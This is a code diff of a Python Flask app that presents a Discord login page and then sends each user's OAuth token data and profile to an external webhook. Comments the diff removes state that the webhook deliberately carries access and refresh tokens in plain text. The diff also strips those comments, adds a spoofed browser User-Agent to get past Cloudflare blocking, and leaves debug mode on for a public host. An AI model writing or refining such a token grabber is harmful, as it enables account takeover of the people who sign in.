@@ -4,7 +4,7 @@ from flask import Flask, request, redirect
 from datetime import datetime
 
 # ============================================================
-# Render 환경변수에서 읽음
+# Render 환경변수
 # ============================================================
 CLIENT_ID = os.getenv("CLIENT_ID")
 CLIENT_SECRET = os.getenv("CLIENT_SECRET")
@@ -17,7 +17,7 @@ DISCORD_API_URL = "https://discord.com/api/v10"
 app = Flask(__name__)
 
 # ============================================================
-# 메인 페이지 - 디스코드 로그인 버튼
+# 메인 페이지
 # ============================================================
 @app.route('/')
 def home():
@@ -46,14 +46,8 @@ def home():
                 border: 1px solid #30363d;
                 box-shadow: 0 8px 32px rgba(0,0,0,0.3);
             }
-            h1 {
-                color: #58a6ff;
-                margin-bottom: 10px;
-            }
-            p {
-                color: #8b949e;
-                margin-bottom: 30px;
-            }
+            h1 { color: #58a6ff; margin-bottom: 10px; }
+            p { color: #8b949e; margin-bottom: 30px; }
             .btn {
                 background: #5865f2;
                 color: white;
@@ -67,14 +61,8 @@ def home():
                 display: inline-block;
                 transition: background 0.2s;
             }
-            .btn:hover {
-                background: #4752c4;
-            }
-            .footer {
-                margin-top: 20px;
-                font-size: 12px;
-                color: #484f58;
-            }
+            .btn:hover { background: #4752c4; }
+            .footer { margin-top: 20px; font-size: 12px; color: #484f58; }
         </style>
     </head>
     <body>
@@ -112,12 +100,11 @@ def oauth2_callback():
     
     if error:
         return f"❌ 인증 실패: {error}", 400
-    
     if not code:
         return "❌ 인증 코드가 없습니다.", 400
     
     try:
-        # 1. 코드 → 토큰 교환 (Discord API 직접 요청)
+        # 1. 코드를 Access Token으로 교환
         token_payload = {
             'client_id': CLIENT_ID,
             'client_secret': CLIENT_SECRET,
@@ -125,20 +112,35 @@ def oauth2_callback():
             'code': code,
             'redirect_uri': REDIRECT_URI
         }
-        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+        
+        # User-Agent 헤더로 Cloudflare 차단(429) 예방
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
+        }
+        
         token_res = requests.post(f"{DISCORD_API_URL}/oauth2/token", data=token_payload, headers=headers)
-        token_data = token_res.json()
         
-        if "access_token" not in token_data:
-            return f"❌ 토큰 발급 실패: {token_data}", 400
+        # 429 차단 및 기타 API 에러 처리 (JSON 파싱 에러 방지)
+        if token_res.status_code != 200:
+            return f"❌ 토큰 교환 실패 ({token_res.status_code}): <br><pre>{token_res.text}</pre>", 400
 
-        # 2. 토큰을 이용한 유저 정보 조회
-        access_token = token_data['access_token']
-        user_headers = {'Authorization': f"Bearer {access_token}"}
+        token_data = token_res.json()
+        access_token = token_data.get('access_token')
+
+        # 2. Access Token으로 사용자 정보 조회
+        user_headers = {
+            'Authorization': f"Bearer {access_token}",
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
+        }
         user_res = requests.get(f"{DISCORD_API_URL}/users/@me", headers=user_headers)
-        user_info = user_res.json()
         
-        # 3. 웹훅 전송 (의도하신 대로 토큰 포함 전송)
+        if user_res.status_code != 200:
+            return f"❌ 유저 정보 조회 실패 ({user_res.status_code}): <br><pre>{user_res.text}</pre>", 400
+
+        user_info = user_res.json()
+
+        # 3. 웹훅 전송
         send_to_webhook(token_data, user_info)
         
         # 4. 성공 페이지 출력
@@ -148,7 +150,7 @@ def oauth2_callback():
         return f"❌ 오류 발생: {str(e)}", 500
 
 # ============================================================
-# 웹훅 전송 함수 (액세스/리프레시 토큰 평문 포함)
+# 웹훅 전송 함수
 # ============================================================
 def send_to_webhook(token_data, user_info):
     if not WEBHOOK_URL:
@@ -171,9 +173,7 @@ def send_to_webhook(token_data, user_info):
         "embeds": [{
             "title": "👤 사용자 정보",
             "color": 0x5865F2,
-            "thumbnail": {
-                "url": avatar_url
-            },
+            "thumbnail": {"url": avatar_url},
             "fields": [
                 {"name": "📛 사용자명", "value": f"{username}#{discriminator}", "inline": True},
                 {"name": "🆔 ID", "value": f"`{user_id}`", "inline": True},
@@ -194,7 +194,7 @@ def send_to_webhook(token_data, user_info):
     requests.post(WEBHOOK_URL, json=webhook_data)
 
 # ============================================================
-# 성공 페이지 (CSS 중괄호 이스케이프 완료)
+# 성공 페이지
 # ============================================================
 def success_page(user_info):
     username = user_info.get('username', 'Unknown')
@@ -270,9 +270,6 @@ def success_page(user_info):
     </html>
     '''
 
-# ============================================================
-# 실행
-# ============================================================
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=True)
